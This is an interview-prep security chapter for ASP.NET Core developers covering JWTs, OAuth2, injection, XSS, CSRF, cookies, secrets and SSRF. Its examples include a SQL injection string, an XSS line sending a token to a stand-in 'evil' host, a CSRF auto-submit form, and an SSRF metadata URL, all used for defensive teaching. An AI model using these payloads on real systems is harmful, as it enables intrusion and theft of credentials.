# S. Security
---

## S1 — Authentication & JWT

### Q1. What is the difference between authentication and authorization?

**Answer.** **Authentication** answers *"who are you?"* — it verifies identity. **Authorization** answers *"what are you allowed to do?"* — it decides whether that known user may perform an action.

Authentication always comes first: you can't decide what someone may do until you know who they are.

In ASP.NET Core these are two separate middleware steps, and **the order matters**:

```csharp
app.UseAuthentication();   // WHO — builds HttpContext.User
app.UseAuthorization();    // WHAT — checks policies against that User
```

❌ Swap them and `HttpContext.User` is still empty when authorization runs, so every `[Authorize]` fails.

The distinction interviewers probe is the status codes:

- **401 Unauthorized** — you haven't proven who you are. (Badly named; it means *unauthenticated*.)
- **403 Forbidden** — we know who you are, and you're not allowed.

---

### Q2. What is a JWT, and what is its structure?

**Answer.** A **JSON Web Token** is a self-contained token with three base64-encoded parts joined by dots:

```
header.payload.signature
```

- **Header** — the signing algorithm, e.g. `RS256`.
- **Payload** — the claims: subject, issuer, audience, expiry, roles.
- **Signature** — proves the token wasn't tampered with.

❌ **The critical point: a JWT is signed, not encrypted.** The payload is only base64-encoded, so anyone holding the token can read every claim — paste it into jwt.io and see. The signature guarantees the token wasn't *changed*; it does nothing to keep it *private*.

So **never put passwords, secrets, or sensitive personal data in a JWT payload.**

Because it's self-contained, an API can validate a JWT offline with just the signing key — no call to the auth server. That's the scalability win, and also why revocation is hard (Q4).

---

### Q3. What must you validate when accepting a JWT?

**Answer.** Four things. Most JWT vulnerabilities are a missing check here.

1. **Signature** — recompute it with the trusted key.
2. **Issuer (`iss`)** — the token came from the auth server you trust.
3. **Audience (`aud`)** — the token was meant for *this* API.
4. **Expiry (`exp`)** — reject expired tokens.

```csharp
options.TokenValidationParameters = new TokenValidationParameters
{
    ValidateIssuer = true,   ValidIssuer = "https://auth.myco.com",
    ValidateAudience = true, ValidAudience = "orders-api",
    ValidateLifetime = true,
    ValidateIssuerSigningKey = true,
    ValidAlgorithms = new[] { "RS256" }    // pin it — see below
};
```

**The classic attacks when checks are missing:**

- **No audience check** → **token replay across services.** A token issued for App A is accepted by App B, because both only verified the signature. This is the most commonly skipped check.
- **`alg: none`** — the attacker strips the signature and claims the algorithm is "none".
- **Algorithm confusion (RS256 → HS256)** — the server expects an asymmetric key. The attacker switches the header to HS256 and signs using the **public key** as the shared secret. A library that trusts the token's own header will accept it. Fix: pin the algorithm, so the token never decides.

The good news is `AddJwtBearer` validates all four by default and rejects `alg: none`. The real-world danger is someone setting `ValidateAudience = false` to "make it work" in dev, and it ships.

---

### Q4. Why is JWT revocation hard, and how do you handle logout?

**Answer.** Because a JWT is **stateless** — the API validates it offline with the key and never checks a database. There's no server-side session to delete, so a valid token stays valid until it expires. You can't simply "log someone out".

Four ways to deal with it:

- **Keep access tokens short-lived** (5–15 minutes). The main answer — it bounds the damage window.
- **Revoke the refresh token**, so no *new* access tokens can be minted. The current one dies quickly on its own. This is the usual approach.
- **Keep a denylist** of revoked token IDs, checked per request. Works, but reintroduces the database lookup JWTs were meant to avoid.
- **Rotate the signing key** — invalidates everything and logs everyone out.

In practice, **logout means deleting the token on the client and revoking the refresh token on the server** (Q4b). The access token itself keeps working for its remaining few minutes, which is why it must be short-lived.

---

### Q4b. What is a refresh token?

**Answer.** A **refresh token** is a long-lived credential whose only job is to obtain new access tokens. It is issued at login alongside the access token, and it goes to nothing except the auth server's refresh endpoint.

**Why two tokens instead of one.** It resolves a conflict:

- A stolen access token works until it expires, so you want a **short** expiry.
- Making users log in every 10 minutes is unusable, so you want a **long** session.

You cannot have both with one token. So you split the job:

|  | Access token | Refresh token |
|---|---|---|
| Lifetime | 5–15 minutes | days or weeks |
| Sent to | every API call | only the auth server |
| Stored by server | not at all | yes — so it can be revoked |
| If stolen | works until it expires | can be revoked immediately |

The access token stays short-lived and stateless. The refresh token is long-lived but **stateful** — the server keeps a record, so it can be cancelled. That record is what makes logout possible at all.

**The flow:**

```text
POST /login          → access token (15 min) + refresh token (14 days)
... 15 minutes later, API returns 401 ...
POST /refresh        → send refresh token
                     → new access token (+ new refresh token if rotating)
```

The client does this silently on the first 401, so the user notices nothing.

**Refresh token rotation.** Each refresh issues a *new* refresh token and invalidates the one just used. This turns silent theft into a detectable event: if an attacker steals a refresh token and uses it, the real user's next refresh presents an already-consumed token. The server sees the reuse and revokes the entire token family, ending both sessions.

**Handling them safely:**

- Store them **hashed**, like passwords — a leaked database should not hand over live sessions.
- Send them in an `httpOnly`, `Secure`, `SameSite` cookie scoped to the refresh path (Q5).
- Give them an absolute expiry as well as a sliding one, so a session cannot be extended forever.
- Never put a refresh token in `localStorage` or in a URL.

---

### Q5. Where should a browser store a JWT?

**Answer.** A real trade-off, and you need to name both risks.

| | `localStorage` | `httpOnly` cookie |
|---|---|---|
| Readable by JavaScript | **Yes** → XSS can steal it | No |
| Sent automatically | No | **Yes** → CSRF possible |
| Main risk | Token theft via XSS | CSRF |

**`localStorage`** is vulnerable to XSS: one successful payload does `fetch(evil, { body: localStorage.token })` and the token is gone. But it's immune to CSRF, because your code sets the `Authorization` header explicitly.

**An `httpOnly` cookie** can't be read by JavaScript, so XSS can't steal it. But the browser attaches it to every request automatically, which is what makes CSRF possible (Q11).

**The senior answer: prefer the httpOnly cookie** with `Secure` and `SameSite`, because **XSS token theft is a total compromise while CSRF has robust, well-understood defences**. Neither is safe on its own.

---

### Q6. What does "bearer token" mean?

**Answer.** It means **whoever holds the token is treated as its owner**. The server doesn't check that the presenter is who the token was issued to — possession alone grants access.

```
Authorization: Bearer eyJhbGciOiJSUzI1NiIs...
```

It's like cash: whoever holds it can spend it. That's why a leaked token is a live credential, and why everything else follows from protecting it — HTTPS always (so it can't be sniffed), short lifetimes (Q4), and never in a URL or a log (Q18).

---

### Q7. Explain the OAuth2 Authorization Code + PKCE flow.

**Answer.** **OAuth2** lets a user grant an app limited access to their data **without sharing their password**. Four roles:

- **Resource owner** — the user.
- **Client** — the app wanting access.
- **Authorization server** — issues tokens.
- **Resource server** — the API that accepts them.

**Authorization Code + PKCE** is the flow to use for every client type today:

1. The client generates a random secret (the **verifier**) and sends its hash (the **challenge**).
2. The user logs in at the authorization server and is redirected back with a short-lived **code**.
3. The client exchanges that code **plus the original verifier** for tokens.
4. The server hashes the verifier and compares — no match, no tokens.

**What PKCE prevents:** an attacker who intercepts the authorization code can't use it, because they don't have the verifier. That matters because a mobile or single-page app can't keep a client secret — anything shipped to a device is public.

❌ **The implicit flow is dead.** It returned the access token directly in the URL fragment, which meant tokens in browser history, in referrer headers, and in server logs, with no way to authenticate the client. Use Authorization Code + PKCE for SPAs instead.

**OpenID Connect (OIDC)** is a thin layer on top of OAuth2 that adds authentication. The security point worth knowing: the **`id_token` is about the user** (proving who logged in, for your app to read) and the **`access_token` is for calling APIs**. ❌ Never send an `id_token` to an API as if it were an access token — it has the wrong audience and wasn't issued for that.

---

## S2 — OWASP Top 10

### Q8. What is the OWASP Top 10?

**Answer.** A community-published list of the ten most critical web application security risks, updated every few years. It's the standard shared vocabulary for talking about web security.

The 2021 list:

| | Risk |
|---|---|
| **A01** | **Broken Access Control** — users reaching data or actions they shouldn't (Q15) |
| **A02** | Cryptographic Failures — weak or missing encryption, secrets in the clear |
| **A03** | **Injection** — SQL injection, XSS (Q9, Q10) |
| **A04** | Insecure Design — a missing control rather than a coding bug |
| **A05** | Security Misconfiguration — defaults left on, verbose errors, open buckets |
| **A06** | Vulnerable Components — outdated packages with known CVEs |
| **A07** | Identification & Authentication Failures — weak logins, bad token handling |
| **A08** | Software & Data Integrity Failures — insecure deserialization, unsigned updates |
| **A09** | Logging & Monitoring Failures — you can't detect a breach you never logged |
| **A10** | SSRF — making the server fetch a URL an attacker chose (Q16) |

**What surprises people:** the top item is **Broken Access Control**, not injection. Injection is famous, but frameworks now protect you by default — parameterized queries and auto-encoding templates. Access control has no framework default, because only your code knows that order #42 belongs to user #7. Every check has to be written, and one missing check is a breach.

---

## S3 — Injection

### Q9. What is SQL injection, and how do you prevent it?

**Answer.** **SQL injection** is when user input is concatenated into a SQL string, so the input can change what the query *does* rather than just what it searches for.

```csharp
// ❌ vulnerable
var sql = "SELECT * FROM Users WHERE Name = '" + name + "'";
```

Enter `' OR '1'='1' --` as the name and the query becomes:

```sql
SELECT * FROM Users WHERE Name = '' OR '1'='1' --'
```

That returns every user. Worse input can drop tables or read other ones.

**The fix is parameterization** — send the SQL and the values separately, so the database never parses the input as code:

```csharp
// ✅ safe — the value is a parameter, not part of the SQL text
cmd.CommandText = "SELECT * FROM Users WHERE Name = @name";
cmd.Parameters.AddWithValue("@name", name);
```

**In EF Core, LINQ is parameterized automatically**, so normal queries are safe. The danger is raw SQL:

```csharp
db.Users.FromSql($"SELECT * FROM Users WHERE Name = {name}");           // ✅ parameterized
db.Users.FromSqlRaw("SELECT * FROM Users WHERE Name = '" + name + "'"); // ❌ vulnerable
```

Those two look almost identical. `FromSql` is an interpolated string that EF turns into parameters; `FromSqlRaw` takes whatever string you built.

**Dapper** is the same idea — pass an object, never concatenate:

```csharp
conn.Query<User>("SELECT * FROM Users WHERE Name = @name", new { name });   // ✅
```

❌ **Stored procedures are not automatically safe.** A proc that builds dynamic SQL from its parameters and calls `EXEC` is just as vulnerable. What protects you is parameterization, not where the SQL lives.

---

### Q10. What is XSS, and what is the primary defence?

**Answer.** **Cross-Site Scripting** is getting your malicious script to run in someone else's browser, in the context of a trusted site. Because it runs as that user, it can steal their cookies or tokens, act as them, or read anything on the page.

Three types:

- **Stored** — the payload is saved (a comment, a profile field) and served to everyone who views it. Worst, because it needs no interaction.
- **Reflected** — the payload comes from the request and is echoed back, so it needs a crafted link.
- **DOM-based** — no server involvement; client-side JS writes untrusted data into the page.

**The primary defence is output encoding** — escaping data when you write it into a page, so it's treated as text rather than code.

❌ **And the encoding must match the context.** This is the part people miss:

```cshtml
@Model.Name                                      <!-- ✅ HTML context — Razor encodes -->
<script>var u = "@Model.Name";</script>          <!-- ❌ JS context — wrong encoding -->
<script>var u = @Json.Serialize(Model.Name);</script>   <!-- ✅ -->
```

HTML encoding doesn't save you inside a `<script>` block, a URL, or a CSS value. Each needs its own encoding.

**In Razor, `@` encodes automatically** — that one default kills most XSS in server-rendered apps. The escape hatch is `@Html.Raw(...)`, which does not encode. Only use it on content you authored or ran through a real HTML sanitizer.

**Am I safe with a JSON API and a React SPA?** Largely, but not automatically. React escapes text by default, so the server-rendered class of XSS mostly goes away. But you can still reintroduce it:

```jsx
<div dangerouslySetInnerHTML={{ __html: userContent }} />   // ❌ exactly what it says
<a href={userProvidedUrl}>click</a>                          // ❌ javascript: URLs
```

**Two layers behind encoding:**

- **`HttpOnly` cookies** — JavaScript can't read them, so even a successful XSS can't steal the session cookie.
- **Content-Security-Policy** — tells the browser which scripts may run, so injected inline script is blocked even if your encoding missed a spot.

---

## S4 — CSRF

### Q11. What is CSRF, and why are bearer-token APIs immune?

**Answer.** **Cross-Site Request Forgery** tricks a logged-in user's browser into sending a request they didn't intend. The user visits a malicious page, which submits a form to your site — and **the browser attaches their cookies automatically**, so the request looks legitimate.

```html
<!-- on evil.com — auto-submits to your bank -->
<form action="https://bank.com/transfer" method="post">
  <input name="to" value="attacker"><input name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
```

**Whether you're vulnerable depends entirely on how you authenticate:**

| Auth method | Vulnerable? | Why |
|---|---|---|
| **Cookie / session** | **Yes** | The browser sends cookies automatically, cross-site |
| **`Authorization: Bearer`** | **No** | The browser never adds that header — your JS must |

That's the key insight: CSRF needs **ambient credentials**, something the browser sends without being asked. A bearer token isn't ambient. ⚠️ But put that JWT in a cookie and CSRF is back.

**The defence for cookie auth is an antiforgery token.** One value in a cookie, a matching one in the form. The attacker's page can cause your cookie to be *sent*, but it cannot *read* your cookies or your HTML, so it can't produce the matching field.

```cshtml
<form asp-action="Transfer" method="post">   @* ✅ token added automatically *@
```

Two things to get right:

- **Injection is automatic, validation is not.** Use **`[AutoValidateAntiforgeryToken]` globally** so every POST/PUT/DELETE is checked — forgetting a per-action attribute is a silent hole.
- **Keep GET side-effect-free.** No token helps if `GET /delete/5` deletes something; an `<img src>` anywhere triggers it.

**`SameSite`** is the second layer — a cookie attribute controlling whether the cookie is sent on cross-site requests:

- **`Strict`** — never sent cross-site. Safest, but following a link to your site won't carry the session.
- **`Lax`** (the modern default) — sent on top-level navigation, not on cross-site POSTs. Blocks most CSRF.
- **`None`** — always sent; requires `Secure`.

`Lax` blocks the common attack, but keep the antiforgery token — treat SameSite as defence in depth, not a replacement.

---

## S5 — HTTPS, Cookies & Headers

### Q12. What does HTTPS give you, and what is HSTS?

**Answer.** **TLS** (the S in HTTPS) provides three things:

- **Confidentiality** — nobody on the network can read the traffic.
- **Integrity** — nobody can modify it in flight.
- **Authenticity** — the certificate proves you're talking to the real server.

Without it, everything else is theatre: tokens, passwords, and cookies all travel in the clear.

**Enforce it in ASP.NET Core:**

```csharp
app.UseHsts();                 // production only
app.UseHttpsRedirection();
```

**HSTS** (HTTP Strict Transport Security) is a response header telling the browser *"only ever use HTTPS for this domain"* for a given period. It closes the gap that redirects leave open: the **very first** plain-HTTP request can still be intercepted before the redirect arrives. After one HSTS response, the browser refuses to send HTTP at all.

⚠️ **The pitfalls:** browsers **cache HSTS for the whole `max-age`**, so shipping a long one before your certificates are solid can make your site unreachable, and you can't undo it remotely. Start with a small `max-age`. Also never send HSTS in development — it will pin `localhost` to HTTPS across all your projects.

---

### Q13. What flags make a cookie secure?

**Answer.** Three, and each blocks a different attack:

```csharp
options.Cookie.HttpOnly = true;
options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
options.Cookie.SameSite = SameSiteMode.Lax;
```

| Flag | What it does | Blocks |
|---|---|---|
| **`HttpOnly`** | JavaScript can't read the cookie | XSS stealing the session (Q10) |
| **`Secure`** | Only sent over HTTPS | Network sniffing |
| **`SameSite`** | Limits cross-site sending | CSRF (Q11) |

All three on an auth cookie, always. `HttpOnly` is the one people forget, and it's what turns a successful XSS from "session stolen" into "script ran but couldn't take the cookie".

---

### Q14. Which security response headers matter?

**Answer.** Headers that tell the browser to enforce restrictions for you.

| Header | What it does |
|---|---|
| **`Content-Security-Policy`** | Controls which scripts and resources may load — the strongest XSS defence after encoding |
| **`Strict-Transport-Security`** | HTTPS only (Q12) |
| **`X-Content-Type-Options: nosniff`** | Stops the browser guessing a file's type and running it as script |
| **`X-Frame-Options: DENY`** | Blocks your site being framed — prevents clickjacking |
| **`Referrer-Policy`** | Stops URLs (possibly containing tokens) leaking to other sites |

```csharp
app.Use(async (ctx, next) =>
{
    ctx.Response.Headers["X-Content-Type-Options"] = "nosniff";
    ctx.Response.Headers["X-Frame-Options"] = "DENY";
    ctx.Response.Headers["Referrer-Policy"] = "no-referrer";
    ctx.Response.Headers["Content-Security-Policy"] = "default-src 'self'";
    await next();
});
```

Add it **early** in the pipeline so the headers are set before anything writes a response.

**CSP is the one worth effort.** A strict policy means injected inline script simply doesn't execute, even if your encoding missed something. It's also the fiddliest, because inline scripts and third-party widgets need explicit allowances — roll it out in report-only mode first.

---

## S6 — Secrets & Passwords

### Q15. How should secrets be managed, and why never in `appsettings.json`?

**Answer.** Because `appsettings.json` is **committed to source control**. A secret there is visible to everyone with repo access, lives forever in git history, and leaks entirely if the repo is ever made public. Deleting it later doesn't help — it's still in the history.

Per environment:

- **Development** — **User Secrets** (`dotnet user-secrets set "Db:Password" "..."`). Stored outside the project folder, so it can't be committed.
- **Production** — a **secret manager**: Azure Key Vault, AWS Secrets Manager, HashiCorp Vault. Environment variables are acceptable but weaker, since they show up in crash dumps and process listings.

All of these plug into `IConfiguration`, so your code doesn't change:

```csharp
var conn = builder.Configuration.GetConnectionString("Default");   // same line everywhere
```

Related: **Data Protection keys.** ASP.NET Core encrypts auth cookies and antiforgery tokens with a key ring that **defaults to per-machine storage**. With multiple servers, each generates its own keys, so server B can't decrypt what A issued — users get random logouts and antiforgery failures. Fix it by persisting the keys to shared storage plus `SetApplicationName` so all instances agree.

---

### Q16. How should passwords be stored?

**Answer.** With a **slow, salted hash designed for passwords** — never encrypted, never a fast hash.

Use **`bcrypt`**, **`scrypt`**, **`Argon2`**, or **PBKDF2**. In .NET, the simplest correct answer is to use ASP.NET Core Identity, which does this properly by default.

**Why not MD5 or SHA-256?** Because they're **fast**, which is a virtue for checksums and a fatal flaw for passwords. A GPU computes billions of SHA-256 hashes per second, so a stolen table of them is brute-forced quickly. Password hashes are deliberately slow — a few hundred milliseconds each — making mass guessing impractical.

**Why a salt?** A random value per password, stored alongside the hash. Without it, identical passwords produce identical hashes, so an attacker cracks one and gets every user who chose it — and precomputed rainbow tables work. A salt makes every hash unique.

**Why hash and not encrypt?** Encryption is reversible. If you can decrypt passwords, so can whoever steals your key. You never need the original — only to check whether a submitted password produces the same hash.

**The related "know the difference" question:**

| | Reversible? | Purpose |
|---|---|---|
| **Hashing** | No | Verify without storing the original — passwords |
| **Encryption** | Yes, with the key | Keep data secret but recoverable |
| **Encoding** (base64) | Yes, by anyone | Format data for transport — **not security at all** |

❌ Calling base64 "encryption" is an instant fail. It's a formatting scheme with no key and no protection.

---

## S7 — Common Application Risks

### Q17. What is broken access control / IDOR?

**Answer.** **IDOR** (Insecure Direct Object Reference) is when your code takes an ID from the request and uses it without checking the caller is allowed that record.

```csharp
// ❌ any logged-in user can read ANY order by changing the URL
[HttpGet("api/orders/{id}")]
public async Task<IActionResult> Get(int id)
    => Ok(await _db.Orders.FindAsync(id));
```

The user is authenticated, so `[Authorize]` passes. Nothing checks the order is *theirs*. Change `/api/orders/42` to `/43` and you're reading someone else's data.

**The fix: scope every query to the caller.**

```csharp
// ✅ ownership is part of the query — a wrong id returns 404, not someone else's order
[HttpGet("api/orders/{id}")]
public async Task<IActionResult> Get(int id)
{
    var userId = User.FindFirst(ClaimTypes.NameIdentifier)!.Value;

    var order = await _db.Orders
        .FirstOrDefaultAsync(o => o.Id == id && o.UserId == userId);

    return order is null ? NotFound() : Ok(order);
}
```

Putting the ownership check **in the `WHERE` clause** is better than loading then comparing — you can't forget the second step if there isn't one.

This is **OWASP A01, the number one risk** (Q8), because no framework can do it for you. Only your code knows who owns what.

⚠️ Guessable sequential IDs make it trivial to probe. Using GUIDs helps, but it's obscurity, not a fix — the authorization check is the fix.

---

### Q18. What other application risks come up, and how do you handle them?

**Answer.** Four worth knowing.

**Mass assignment (over-posting).** Model binding matches by name, so an attacker can post fields your form never rendered:

```csharp
public IActionResult Edit(User user) { _db.Update(user); }   // ❌ post IsAdmin=true → admin
```

Bind to a ViewModel containing only the fields you allow, then copy them across deliberately. Covered in [dotnet-mvc-razor.md](dotnet-mvc-razor.md).

**SSRF (Server-Side Request Forgery).** Your server fetches a URL the user supplied — so the attacker points it at your internal network:

```csharp
var data = await _http.GetStringAsync(userProvidedUrl);   // ❌
// attacker sends http://169.254.169.254/... → your cloud credentials
```

That address is the cloud metadata endpoint, reachable from inside but not outside. Defend with an **allowlist** of permitted hosts, block private IP ranges, and disable automatic redirects (a redirect can send you somewhere the allowlist rejected).

**Rate limiting.** Without it, login endpoints can be brute-forced and expensive endpoints become a cheap denial of service. .NET 7+ has it built in:

```csharp
builder.Services.AddRateLimiter(o => o.AddFixedWindowLimiter("login", opt =>
{
    opt.PermitLimit = 5;
    opt.Window = TimeSpan.FromMinutes(1);
}));
```

**Logging secrets and PII.** Logs get shipped to systems with far broader access than your database, and they're kept for a long time.

```csharp
_logger.LogInformation("Login attempt {Email} {Password}", email, password);  // ❌ forever
_logger.LogInformation("Login attempt for user {UserId}", user.Id);           // ✅
```

The usual accidental leaks are logging a whole request object, an exception carrying a connection string, or a token in a URL query string (which lands in every web-server access log). Log IDs, not values.

**Dependency security.** Most of your code is other people's. Run `dotnet list package --vulnerable` in CI, enable Dependabot, and keep a lockfile so builds are reproducible.

---

### Q19. How does `ResponseCompression` middleware work in ASP.NET Core, and why should compression be disabled for dynamic responses containing sensitive encrypted data (CRIME/BREACH security mitigation)?

**Answer.** **`ResponseCompression` middleware** (`Microsoft.AspNetCore.ResponseCompression`) automatically compresses HTTP response bodies using Gzip or Brotli algorithms before sending them across the wire, dramatically reducing bandwidth usage for large payloads.

```csharp
builder.Services.AddResponseCompression(options =>
{
    options.EnableForHttps = false; // ⚠️ Keep false for HTTPS by default!
    options.Providers.Add<BrotliCompressionProvider>();
    options.Providers.Add<GzipCompressionProvider>();
});

var app = builder.Build();
app.UseResponseCompression();
```

#### The CRIME and BREACH Security Vulnerability
By default, ASP.NET Core **disables response compression for HTTPS requests** (`EnableForHttps = false`).

**Why? The BREACH Attack (Browser Reconnaissance and Exfiltration via Adaptive Compression of Hypertext):**
BREACH is a side-channel attack that targets HTTPS responses containing **both user-reflected secrets** (e.g. CSRF tokens, session IDs, or API keys in the response body) **and user-controlled input** (e.g. search query parameters returned on page).

1. **How it works**: Compression algorithms (like DEFLATE/Gzip) replace repeated strings with shorter dictionary references.
2. An attacker tricks a user's browser into sending thousands of requests with slightly varied guesses for the secret token in a query parameter.
3. When the attacker's guess matches part of the secret token, the response body compresses to a **slightly smaller byte size**.
4. By measuring the length of encrypted HTTPS packets (which reveal payload size despite encryption!), the attacker extracts secret tokens character by character.

**Mitigation Rules**:
- Keep `EnableForHttps = false` unless response endpoints return only static or public unauthenticated data.
- If compression on HTTPS is required, mask/rotate anti-forgery tokens on every request or exclude dynamic endpoints containing secrets from compression.

